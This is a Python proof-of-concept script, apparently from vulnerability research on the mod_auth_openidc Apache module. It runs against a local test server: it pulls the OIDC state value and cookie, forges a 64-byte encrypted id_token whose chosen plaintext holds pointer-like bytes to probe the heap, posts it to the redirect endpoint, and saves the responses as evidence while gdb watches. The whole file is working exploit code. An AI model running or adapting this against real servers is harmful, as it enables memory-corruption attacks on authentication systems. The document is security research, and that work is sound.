#!/usr/bin/env python3
"""W188 reproducer: 64-byte chosen wrap for the real-consumer forward heap scan.

Saves only scan64-* evidence so the committed W186/W187 chosen64-* files are
not overwritten. Start w2/gdb-idtoken-scan.cmd under gdb first.
"""
import hashlib
import re
import socket
import urllib.parse

import probe

HOST = "127.0.0.1"
PORT = 18443
UA = "w2-idtoken-scan"
CLIENT_SECRET = "w2-loopback-secret-0123456789"
KEK = hashlib.sha256(CLIENT_SECRET.encode()).digest()[:16]
TAG = "scan64-preserve"


def request(req):
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.sendall(req)
        s.shutdown(socket.SHUT_WR)
        chunks = []
        while True:
            data = s.recv(65536)
            if not data:
                break
            chunks.append(data)
    return b"".join(chunks)


def save(name, data):
    with open("evidence/" + name, "wb") as f:
        f.write(data if isinstance(data, bytes) else data.encode())


def main():
    pt = b"".join([bytes([i + 1]) * 8 for i in range(6)])
    pt = pt[:40] + bytes.fromhex("41bd010000000000") + bytes.fromhex("0200000001000000")
    tok = probe.token(64, kek=KEK, plaintext=pt)
    get = (b"GET /private HTTP/1.1\r\n"
           b"Host: 127.0.0.1:18443\r\n"
           b"User-Agent: " + UA.encode() + b"\r\n"
           b"Accept: text/html\r\n"
           b"Connection: close\r\n\r\n")
    get_resp = request(get)
    save(TAG + "-get.bin", get_resp)
    head = get_resp.split(b"\r\n\r\n", 1)[0].decode("ascii", "replace")
    m = re.search(r"[?&]state=([^&\s\"]+)", head)
    c = re.search(r"Set-Cookie:\s*(mod_auth_openidc_state_[^;]+)", head, re.I)
    if not m or not c:
        raise SystemExit("NO_STATE_OR_COOKIE: " + repr(head[:800]))
    state = urllib.parse.unquote(m.group(1))
    cookie = c.group(1)
    save(TAG + "-state.txt", "state=%s\ncookie=%s\nplaintext=%s\n" % (state, cookie, pt.hex()))
    body = urllib.parse.urlencode({"state": state, "id_token": tok, "response_mode": "form_post"}).encode()
    post = (b"POST /redirect_uri HTTP/1.1\r\n"
            b"Host: 127.0.0.1:18443\r\n"
            b"User-Agent: " + UA.encode() + b"\r\n"
            b"Cookie: " + cookie.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n"
            b"Connection: close\r\n\r\n" + body)
    save(TAG + "-request.bin", post)
    save(TAG + "-token.txt", tok + "\n")
    resp = request(post)
    save(TAG + "-post.bin", resp)
    follow = get.replace(UA.encode(), UA.encode() + b"-follow")
    save(TAG + "-follow.bin", request(follow))
    print("GET=" + repr(get_resp.split(b"\r\n", 1)[0]))
    print("POST=" + repr(resp.split(b"\r\n", 1)[0]))


if __name__ == "__main__":
    main()
